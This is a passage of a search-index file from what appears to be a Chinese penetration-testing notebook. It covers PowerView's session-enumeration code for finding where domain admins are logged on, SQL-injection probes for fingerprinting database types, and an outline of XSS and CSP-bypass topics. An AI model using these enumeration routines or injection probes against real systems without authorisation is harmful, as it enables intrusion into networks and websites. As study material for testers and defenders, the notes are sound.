)","title":"\u53c2\u6570"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#_5","text":"BEGIN { if ($PSBoundParameters['Credential']) { $LogonToken = Invoke-UserImpersonation -Credential $Credential } } \u4e00\u5f00\u59cb\u4f1a\u901a\u8fc7\u8bbe\u7f6e\u7684Credential\u53c2\u6570\u6765\u6a21\u62df\u4ee4\u724c ForEach ($Computer in $ComputerName) { # arguments for NetSessionEnum $QueryLevel = 10 $PtrInfo = [IntPtr]::Zero $EntriesRead = 0 $TotalRead = 0 $ResumeHandle = 0 # get session information $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle) # locate the offset of the initial intPtr $Offset = $PtrInfo.ToInt64() \u7136\u540e\u4f1a\u5faa\u73af\u904d\u5386computername\u4e2d\u7684\u673a\u5668\u540d\uff0c\u5206\u522b\u8c03\u7528Netapi32::NetSessionEnum\u65b9\u6cd5\u6765\u83b7\u53d6session\u4fe1\u606f \u8fd9\u4e2aAPI\u7684\u76f8\u5173\u5b9a\u4e49\u5982\u4e0b\uff08\u5fae\u8f6f\u5b98\u65b9\u6587\u6863\u5df2\u7ecf\u5220\u9664\u4e86\u8fd9\u4e2aAPI\u7684\u5b9a\u4e49\uff09 servername : \u8be5\u5b57\u7b26\u4e32\u6307\u5b9a\u8981\u5728\u5176\u4e0a\u6267\u884c\u51fd\u6570\u7684\u8fdc\u7a0b\u670d\u52a1\u5668\u7684DNS\u6216NetBIOS\u540d\u79f0\u3002\u5982\u679c\u6b64\u53c2\u6570\u4e3a NULL \uff0c\u5219\u4f7f\u7528\u672c\u5730\u8ba1\u7b97\u673a\u3002 UncClientName\uff1a \u8be5\u5b57\u7b26\u4e32\u6307\u5b9a\u8981\u4e3a\u5176\u8fd4\u56de\u4fe1\u606f\u7684\u8ba1\u7b97\u673a\u4f1a\u8bdd\u7684\u540d\u79f0\u3002\u5982\u679c\u6b64\u53c2\u6570\u4e3a NULL \uff0c\u5219 NetSessionEnum \u5c06\u8fd4\u56de\u670d\u52a1\u5668\u4e0a\u6240\u6709\u8ba1\u7b97\u673a\u4f1a\u8bdd\u7684\u4fe1\u606f\u3002 username: \u8be5\u5b57\u7b26\u4e32\u6307\u5b9a\u8981\u4e3a\u5176\u8fd4\u56de\u4fe1\u606f\u7684\u7528\u6237\u7684\u540d\u79f0\u3002\u5982\u679c\u6b64\u53c2\u6570\u4e3a NULL \uff0c\u5219 NetSessionEnum \u5c06\u8fd4\u56de\u6240\u6709\u7528\u6237\u7684\u4fe1\u606f\u3002 level\uff1a \u6307\u5b9a\u6570\u636e\u7684\u4fe1\u606f\u7ea7\u522b\u3002 bufptr\uff1a \u6307\u5411\u63a5\u6536\u6570\u636e\u7684\u7f13\u51b2\u533a\u7684\u6307\u9488\u3002\u6b64\u6570\u636e\u7684\u683c\u5f0f\u53d6\u51b3\u4e8e level \u53c2\u6570\u7684\u503c\u3002\u6b64\u7f13\u51b2\u533a\u7531\u7cfb\u7edf\u5206\u914d\uff0c\u5fc5\u987b\u4f7f\u7528 NetApiBufferFree \u51fd\u6570\u91ca\u653e \u3002\u8bf7\u6ce8\u610f\uff0c\u5373\u4f7f\u51fd\u6570\u56e0 ERROR_MORE_DATA \u800c\u5931\u8d25\uff0c\u4e5f\u5fc5\u987b\u91ca\u653e\u7f13\u51b2\u533a\u3002 prefmaxlen: \u7f13\u51b2\u533a\u5927\u5c0f \u5b83\u4e0d\u5141\u8bb8\u76f4\u63a5\u67e5\u8be2\u662f\u8c01\u767b\u9646\u4e86\u6b64\u5de5\u4f5c\u7ad9\uff0c\u4f46\u662f\u5b83\u5141\u8bb8\u67e5\u8be2\u662f\u8c01\u5728\u8bbf\u95ee\u6b64\u5de5\u4f5c\u7ad9\u7684\u7f51\u7edc\u8d44\u6e90\uff08\u4f8b\u5982\u6587\u4ef6\u5171\u4eab\uff09\u65f6\u6240\u521b\u5efa\u7684\u7f51\u7edc\u4f1a\u8bdd\uff0c\u4ece\u800c\u77e5\u9053\u6765\u81ea\u4f55\u5904\u3002\u5f53\u7136\u8fd9\u91cc\u6700\u597d\u7684\u67e5\u8be2\u5bf9\u8c61\u662f\u57df\u63a7 + \u6587\u4ef6\u5171\u4eab\u670d\u52a1\u5668\u3002\u6b64\u51fd\u6570\u4e0d\u9700\u8981\u9ad8\u6743\u9650\u3002 \u8fd9\u90e8\u5206\u7684\u5927\u81f4\u610f\u601d\u4fbf\u662f\u5faa\u73af\u8bfb\u53d6\u7f13\u51b2\u533a\u91cc\u7684\u5185\u5bb9\uff0c\u5e76\u5c06\u5185\u5bb9\u683c\u5f0f\u5316\u540e\u8f93\u51fa ```\u7eaf\u6587\u672c # 0 = success if (($Result -eq 0) -and ($Offset -gt 0)) { # work out how much to increment the pointer by finding out the size of the structure $Increment = $SESSION_INFO_10::GetSize() # parse all the result structures for ($i = 0; ($i -lt $EntriesRead); $i++) { # create a new int ptr at the given offset and cast the pointer as our result structure $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset $Info = $NewIntPtr -as $SESSION_INFO_10 //-as \u5c06\u6307\u9488\u8f6c\u5316\u4e3a\u6307\u5b9a\u7c7b\u578b\uff08SESSION_INFO_10\u7ed3\u6784\u4f53\uff09 # return all the sections of the structure - have to do it this way for V2 $Session = $Info | Select-Object * $Session | Add-Member Noteproperty 'ComputerName' $Computer $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo') $Offset = $NewIntPtr.ToInt64() $Offset += $Increment $Session } # free up the result buffer $Null = $Netapi32::NetApiBufferFree($PtrInfo) } else { Write-Verbose \"[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)\" } ```","title":"\u5177\u4f53\u903b\u8f91"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#get-netloggedon","text":"\u548cGet-NetSession\u5dee\u4e0d\u591a\uff0c\u4e5f\u662f\u7528\u4e8e\u67e5\u8be2\u67d0\u673a\u5668\u4e0a\u7684\u767b\u5f55\u4f1a\u8bdd\uff0c\u4f46\u662fGet-NetSession\u662f\u4ee5NetSessionEnum Api\u4e3a\u6838\u5fc3\uff0cGet-NetLoggedon\u662f\u4ee5NetWkstaUserEnum Api\u4e3a\u6838\u5fc3","title":"Get-NetLoggedon"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#_6","text":"\u903b\u8f91\u548cGet-NetSession\u5dee\u4e0d\u591a\uff0c\u8fd9\u91cc\u5c31\u7740\u91cd\u4ecb\u7ecd\u4e00\u4e0bNetWkstaUserEnum \u8fd9\u4e2aAPI \u8be5 NetWkstaUserEnum \u529f\u80fd\u53ef\u4ee5\u5217\u51fa\u5f53\u524d\u767b\u5f55\u5230\u8be5\u5de5\u4f5c\u7ad9\u7684\u6240\u6709\u7528\u6237\u7684\u4fe1\u606f\u3002\u6b64\u5217\u8868\u5305\u62ec\u4ea4\u4e92\u5f0f\u3001\u670d\u52a1\u548c\u6279\u91cf\u767b\u5f55\u3002\u6b64\u51fd\u6570\u9700\u8981\u4e3b\u673a\u7684\u7ba1\u7406\u6743\u9650\u6216\u8fd9\u57df\u7ba1\u6743\u9650\uff0c\u9002\u7528\u4e8e\u81ea\u68c0\u4f7f\u7528\u3002 servername\uff1a \u8be5\u5b57\u7b26\u4e32\u6307\u5b9a\u8981\u5728\u5176\u4e0a\u6267\u884c\u51fd\u6570\u7684\u8fdc\u7a0b\u670d\u52a1\u5668\u7684DNS\u6216NetBIOS\u540d\u79f0\u3002\u5982\u679c\u6b64\u53c2\u6570\u4e3a NULL \uff0c\u5219\u4f7f\u7528\u672c\u5730\u8ba1\u7b97\u673a\u3002 level\uff1a \u6307\u5b9a\u6570\u636e\u7684\u4fe1\u606f\u7ea7\u522b\u3002 bufptr\uff1a \u6307\u5411\u63a5\u6536\u6570\u636e\u7684\u7f13\u51b2\u533a\u7684\u6307\u9488\u3002\u6b64\u6570\u636e\u7684\u683c\u5f0f\u53d6\u51b3\u4e8e level \u53c2\u6570\u7684\u503c\u3002\u6b64\u7f13\u51b2\u533a\u7531\u7cfb\u7edf\u5206\u914d\uff0c\u5fc5\u987b\u4f7f\u7528 NetApiBufferFree \u51fd\u6570\u91ca\u653e \u3002\u8bf7\u6ce8\u610f\uff0c\u5373\u4f7f\u51fd\u6570\u56e0 ERROR_MORE_DATA \u800c\u5931\u8d25\uff0c\u4e5f\u5fc5\u987b\u91ca\u653e\u7f13\u51b2\u533a\u3002","title":"\u5177\u4f53\u903b\u8f91"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#find-domainuserlocation","text":"Find-DomainUserLocation\u662f\u4e00\u4e2a\u7528\u4e8e\u5b9a\u4f4d\u7528\u6237\u5728\u54ea\u53f0\u673a\u5668\u4e0a\u767b\u5f55\u7684\u811a\u672c \u8fd9\u4e2a\u811a\u672c\u5176\u5b9e\u5c31\u662f\u4e2a\u7f1d\u5408\u602a\uff0c\u5b83\u7684\u903b\u8f91\u5982\u4e0b","title":"Find-DomainUserLocation"},{"location":"%E6%B8%97%E9%80%8F/%E5%B7%A5%E5%85%B7%E6%B2%89%E6%B7%80/%E7%A0%94%E7%A9%B6/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/powershell%E8%84%9A%E6%9C%AC%E7%9A%84%E5%88%86%E6%9E%90/#_7","text":"\u8fd9\u662f\u5b83\u81ea\u5df1\u7684\u89e3\u91ca This function enumerates all machines on the current (or specified) domain using Get-DomainComputer, and queries the domain for users of a specified group (default 'Domain Admins') with Get-DomainGroupMember. Then for each server the function enumerates any active user sessions with Get-NetSession/Get-NetLoggedon The found user list is compared against the target list, and any matches are displayed. If -ShowAll is specified, all results are displayed instead of the filtered set. If -Stealth is specified, then likely highly-trafficed servers are enumerated with Get-DomainFileServer/Get-DomainController, and session enumeration is executed only against those servers. If -Credential is passed, then Invoke-UserImpersonation is used to impersonate the specified user before enumeration, reverting after with Invoke-RevertToSelf. \u5148\u8c03\u7528Get-DomainComputer\u83b7\u53d6\u57df\u4e2d\u8ba1\u7b97\u673a\u540d\uff0c\u7136\u540e\u901a\u8fc7Get-DomainUser,Get-DomainGroupMember \u6765\u83b7\u53d6\u57df\u4e2d\u7528\u6237\u4fe1\u606f\uff0c\u7136\u540e\u901a\u8fc7Get-NetSession/Get-NetLoggedon\u6765\u67e5\u8be2\u5404\u8ba1\u7b97\u673a\u4e2d\u7684\u767b\u5f55\u4f1a\u8bdd\u4fe1\u606f\u3002","title":"\u5177\u4f53\u903b\u8f91"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/","text":"\u6e17\u900f\u8def\u5f84&\u6c89\u6dc0 \u524d\u6e17\u900f \u540e\u6e17\u900f \u9493\u9c7c","title":"\u6e17\u900f\u8def\u5f84&\u6c89\u6dc0"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/#_1","text":"\u524d\u6e17\u900f \u540e\u6e17\u900f \u9493\u9c7c","title":"\u6e17\u900f\u8def\u5f84&amp;\u6c89\u6dc0"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%89%8D%E6%B8%97%E9%80%8F/","text":"\u524d\u6e17\u900f \u79fb\u52a8\u7aef OWASP10 \u4fe1\u606f\u63a2\u6d4b \u5bf9\u6297 \u4fe1\u606f\u6cc4\u9732 \u793e\u5de5\ud83d\udc56 \u4fe1\u606f\u641c\u96c6trick","title":"\u524d\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/%E5%89%8D%E6%B8%97%E9%80%8F/#_1","text":"\u79fb\u52a8\u7aef OWASP10 \u4fe1\u606f\u63a2\u6d4b \u5bf9\u6297 \u4fe1\u606f\u6cc4\u9732 \u793e\u5de5\ud83d\udc56 \u4fe1\u606f\u641c\u96c6trick","title":"\u524d\u6e17\u900f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/OWASP10/","text":"OWASP10 \u5224\u65ad\u4e0d\u540c\u6570\u636e\u5e93\u7684\u65b9\u6cd5tips \u91cd\u6e29XSS","title":"OWASP10"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/OWASP10/#owasp10","text":"\u5224\u65ad\u4e0d\u540c\u6570\u636e\u5e93\u7684\u65b9\u6cd5tips \u91cd\u6e29XSS","title":"OWASP10"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/","text":"\u5224\u65ad\u4e0d\u540c\u6570\u636e\u5e93\u7684\u65b9\u6cd5tips \u76ee\u5f55 title: sql\u6ce8\u5165\u5224\u65ad\u4e0d\u540c\u6570\u636e\u5e93\u7684tips date: tags: \u5916\u56f4\u6253\u70b9 \u7ecf\u9a8c\u4e4b\u8c08 \u5b57\u7b26\u4e32\u62fc\u63a5 \u7279\u6709\u51fd\u6570 \u65f6\u95f4\u5ef6\u8fdf\u51fd\u6570 mysql\u7279\u6709\u51fd\u6570 \u62a5\u9519 \u7248\u672c\u4fe1\u606f \u7cfb\u7edf\u8868 title: sql\u6ce8\u5165\u5224\u65ad\u4e0d\u540c\u6570\u636e\u5e93\u7684tips date: tags: \u5916\u56f4\u6253\u70b9 \u7ecf\u9a8c\u4e4b\u8c08 Asp\u548c.net\u901a\u5e38\u4f7f\u7528sqlserver Php\u901a\u5e38\u4f7f\u7528mysql\u6216\u8005postgresql Java\u901a\u5e38\u662foracle\u6216mysql Iis\u670d\u52a1\u5668\u662f\u57fa\u4e8ewindows\u7684\u67b6\u6784\uff0c\u540e\u53f0\u6570\u636e\u5e93\u6709\u53ef\u80fd\u662fsqlserver Apache\u670d\u52a1\u5668\uff0c\u53ef\u80fd\u4f7f\u7528\u5f00\u6e90\u6570\u636e\u5e93mysql\u6216postgresql \u5b57\u7b26\u4e32\u62fc\u63a5 ORACLE\uff1a'a'||'a' =aa MS-SQL\uff1a'a'+'a' =aa MYSQL\uff1a'a' 'a' =aa \u7279\u6709\u51fd\u6570 \u65f6\u95f4\u5ef6\u8fdf\u51fd\u6570 oracle: \u4f7f\u7528UTL_HTTP\u5411\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684ip\u53d1\u8d77\u94fe\u63a5\u8bf7\u6c42\uff0c\u82e5\u8fd4\u56de\u9875\u9762\u5927\u5e45\u5ea6\u5ef6\u8fdf\u5219\u53ef\u5224\u5b9a\u4e3aoracle mssql:\u4f7f\u7528\u8bed\u53e5 waitfor delay '0:0:10' \u82e5\u8fd4\u56de\u9875\u9762\u5927\u5e45\u5ea6\u5ef6\u8fdf\u5219\u53ef\u5224\u5b9a\u4e3amssql mysql: sleep\u51fd\u6570\u6765\u4ea7\u751f\u5ef6\u8fdf mysql\u7279\u6709\u51fd\u6570 BENCHMARK. \u7528\u4e8e\u6d4b\u8bd5\u7279\u5b9a\u64cd\u4f5c\u7684\u6267\u884c\u901f\u5ea6 select BENCHMARK(1000000,md5('admin')) \u62a5\u9519 \u5c1d\u8bd5\u8ba9\u8bed\u53e5\u62a5\u9519\uff0c\u4ece\u9519\u8bef\u4fe1\u606f\u4e2d\u83b7\u53d6\u6570\u636e\u5e93\u4fe1\u606f \u7248\u672c\u4fe1\u606f \u7cfb\u7edf\u8868 mssql:(select count(*) from sysobjects)>0 access: (select count(*) from msysobjects)>0 mysql:(select count(*) from information_schema.TABLES)>0 orcle:(select count(*) from sys.user_tables)>0","title":"\u5224\u65ad\u4e0d\u540c\u6570\u636e\u5e93\u7684\u65b9\u6cd5tips"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/#tips","text":"","title":"\u5224\u65ad\u4e0d\u540c\u6570\u636e\u5e93\u7684\u65b9\u6cd5tips"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/#_1","text":"title: sql\u6ce8\u5165\u5224\u65ad\u4e0d\u540c\u6570\u636e\u5e93\u7684tips date: tags: \u5916\u56f4\u6253\u70b9 \u7ecf\u9a8c\u4e4b\u8c08 \u5b57\u7b26\u4e32\u62fc\u63a5 \u7279\u6709\u51fd\u6570 \u65f6\u95f4\u5ef6\u8fdf\u51fd\u6570 mysql\u7279\u6709\u51fd\u6570 \u62a5\u9519 \u7248\u672c\u4fe1\u606f \u7cfb\u7edf\u8868 title: sql\u6ce8\u5165\u5224\u65ad\u4e0d\u540c\u6570\u636e\u5e93\u7684tips date: tags: \u5916\u56f4\u6253\u70b9","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/#_2","text":"Asp\u548c.net\u901a\u5e38\u4f7f\u7528sqlserver Php\u901a\u5e38\u4f7f\u7528mysql\u6216\u8005postgresql Java\u901a\u5e38\u662foracle\u6216mysql Iis\u670d\u52a1\u5668\u662f\u57fa\u4e8ewindows\u7684\u67b6\u6784\uff0c\u540e\u53f0\u6570\u636e\u5e93\u6709\u53ef\u80fd\u662fsqlserver Apache\u670d\u52a1\u5668\uff0c\u53ef\u80fd\u4f7f\u7528\u5f00\u6e90\u6570\u636e\u5e93mysql\u6216postgresql","title":"\u7ecf\u9a8c\u4e4b\u8c08"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/#_3","text":"ORACLE\uff1a'a'||'a' =aa MS-SQL\uff1a'a'+'a' =aa MYSQL\uff1a'a' 'a' =aa","title":"\u5b57\u7b26\u4e32\u62fc\u63a5"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/#_4","text":"","title":"\u7279\u6709\u51fd\u6570"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/#_5","text":"oracle: \u4f7f\u7528UTL_HTTP\u5411\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684ip\u53d1\u8d77\u94fe\u63a5\u8bf7\u6c42\uff0c\u82e5\u8fd4\u56de\u9875\u9762\u5927\u5e45\u5ea6\u5ef6\u8fdf\u5219\u53ef\u5224\u5b9a\u4e3aoracle mssql:\u4f7f\u7528\u8bed\u53e5 waitfor delay '0:0:10' \u82e5\u8fd4\u56de\u9875\u9762\u5927\u5e45\u5ea6\u5ef6\u8fdf\u5219\u53ef\u5224\u5b9a\u4e3amssql mysql: sleep\u51fd\u6570\u6765\u4ea7\u751f\u5ef6\u8fdf","title":"\u65f6\u95f4\u5ef6\u8fdf\u51fd\u6570"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/#mysql","text":"BENCHMARK. \u7528\u4e8e\u6d4b\u8bd5\u7279\u5b9a\u64cd\u4f5c\u7684\u6267\u884c\u901f\u5ea6 select BENCHMARK(1000000,md5('admin'))","title":"mysql\u7279\u6709\u51fd\u6570"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/#_6","text":"\u5c1d\u8bd5\u8ba9\u8bed\u53e5\u62a5\u9519\uff0c\u4ece\u9519\u8bef\u4fe1\u606f\u4e2d\u83b7\u53d6\u6570\u636e\u5e93\u4fe1\u606f","title":"\u62a5\u9519"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/#_7","text":"","title":"\u7248\u672c\u4fe1\u606f"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/%E5%88%A4%E6%96%AD%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%96%B9%E6%B3%95tips/#_8","text":"mssql:(select count(*) from sysobjects)>0 access: (select count(*) from msysobjects)>0 mysql:(select count(*) from information_schema.TABLES)>0 orcle:(select count(*) from sys.user_tables)>0","title":"\u7cfb\u7edf\u8868"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%89%8D%E6%B8%97%E9%80%8F/OWASP10/%E9%87%8D%E6%B8%A9XSS/%E9%87%8D%E6%B8%A9XSS/","text":"\u91cd\u6e29XSS \u76ee\u5f55 title: XSS\u7684\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5 date: tags: \u5916\u56f4\u6253\u70b9 \u540c\u6e90\u7b56\u7565\u4e0e\u8de8\u57df \u540c\u6e90\u7b56\u7565 \u540c\u6e90\u7684\u5b9a\u4e49 \u540c\u6e90\u7b56\u7565\u7684\u4f5c\u7528 \u8de8\u57df CORS \u5b9e\u73b0\u539f\u7406 JSONP CSP CSP\u89c4\u5219 \u542f\u7528CSP \u4e00\u4e9b\u5176\u4ed6XSS\u4fdd\u62a4\u673a\u5236 X-Frame XSS auditor httponly htmlspecialchars \u653b\u51fb\u624b\u6bb5 bypass csp JSONP \u52ab\u6301 \u5e38\u7528\u89e6\u53d1\u70b9\u4e0ebypass title: XSS\u7684\u4e00\u4e9b\u57fa\u672c\u6982\u5ff5 date: tags: \u5916\u56f4\u6253\u70b9 \u540c\u6e90\u7b56\u7565\u4e0e\u8de8\u57df \u540c\u6e90\u7b56\u7565 \u540c\u6e90\u7684\u5b9a\u4e49 \u82e5\u4e24\u4e2aURL \u534f\u8bae\uff0c\u7aef\u53e3\uff0chost\u90fd\u76f8\u540c\uff0c\u5219\u8fd9\u4e24\u4e2aURL\u540c\u6e90\u3002 \u8fd9\u4e2a\u65b9\u6848\u53eb\u505a\u201c\u534f\u8bae/\u4e3b\u673a/\u7aef\u53e3\u5143\u7ec4\u201d\uff0c\u6216\u8005\u76f4\u63a5\u662f \u201c\u5143\u7ec4\u201d \u540c\u6e90\u7b56\u7565\u53c8\u5206\u4e3aDOM\u540c\u6e90\u7b56\u7565(\u7981\u6b62\u5bf9\u4e0d\u540c\u6e90\u7684\u9875\u9762\u7684DOM\u8fdb\u884c\u64cd\u4f5c)\u548cXMLHttpRequest(\u7981\u6b62XHR\u5bf9\u8c61\u9879\u4e0d\u540c\u6e90\u7684\u670d\u52a1\u5668\u5730\u5740\u53d1\u8d77HTTP\u8bf7\u6c42)\u540c\u6e90\u7b56\u7565 \u540c\u6e90\u7b56\u7565\u7684\u4f5c\u7528 \u9650\u5236\u4e00\u4e2aJS\u811a\u672c\u5bf9\u4e0d\u540c\u6e90\u7684URL\u8fdb\u884c\u64cd\u4f5c\u3002 \u8fd9\u4e48\u8bf4\u53ef\u80fd\u4f1a\u6709\u70b9\u62bd\u8c61\uff0c\u90a3\u4e0d\u5982\u770b\u770b\u4e0b\u9762\u7684\u4f8b\u5b50: 